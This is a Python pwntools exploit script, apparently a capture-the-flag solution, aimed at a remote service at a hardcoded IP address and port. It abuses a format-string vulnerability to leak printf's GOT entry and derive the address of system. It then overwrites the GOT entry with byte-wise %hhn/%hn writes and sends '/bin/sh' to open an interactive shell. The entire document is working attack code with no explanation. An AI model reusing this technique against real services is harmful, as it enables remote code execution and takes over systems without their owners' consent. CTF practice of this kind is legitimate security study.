from pwn import *

def leak(addr):
    payload = "%7$s.AAA"+p64(addr)
    r.sendline(payload)
    print "leaking:", hex(addr)
    resp = r.recvuntil(".AAA")
    ret = resp[:-4:] + "\x00"
    print "ret:", repr(ret)
    r.recvrepeat(0.2) # receive the rest of the string
    return ret
"""
[+] printf_addr: 0x7f58a84ba800
[+] system_addr: 0x7f58a84aa390
""" 

r = remote('47.75.182.113', 9999)

#d = DynELF(leak, 0x40060d)
printf_got = 0x601020
printf_addr = u64(leak(printf_got+1).ljust(8, "\x00"))<<8
log.success("printf_addr: "+hex(printf_addr))
system_addr = printf_addr - 0x10470
log.success("system_addr: "+hex(system_addr))

byte1 = system_addr & 0xff
byte2 = (system_addr & 0xffff00) >> 8
log.success("byte1: "+hex(byte1))
log.success("byte2: "+hex(byte2))
payload = "%" + str(byte1) + "c" + "%10$hhn."
payload += "%" + str(byte2-byte1-1) + "c" + "%11$hn."
payload = payload.ljust(32, "A")
payload += p64(printf_got) + p64(printf_got+1)
r.sendline(payload)
r.recv(2048)
r.sendline("/bin/sh\x00")
r.interactive()
